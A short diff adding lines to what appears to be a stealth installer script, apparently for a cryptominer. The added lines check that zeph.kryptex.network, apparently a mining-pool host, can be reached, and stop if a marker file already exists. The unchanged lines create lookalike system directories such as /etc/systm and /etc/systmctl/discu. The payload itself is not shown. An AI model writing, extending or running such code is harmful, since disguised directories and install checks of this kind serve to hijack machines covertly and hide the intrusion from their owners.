@@ -1,3 +1,21 @@
+HOST="zeph.kryptex.network"
+
+if curl --output /dev/null --silent --head --fail "http://$HOST"; then
+    echo "The network is smooth to $HOST"
+else
+    echo "connection failed to $HOST"
+    exit 1
+fi
+
+
+if [ -f "/etc/systmctl/discpu/tmpdthmm" ];then
+    echo "tmpdthmm OK"
+    exit 1
+fi
+
+
+
+
 mkdir /etc/systm
 mkdir -p /etc/systmctl/discu
 cd /etc/systmctl/discu
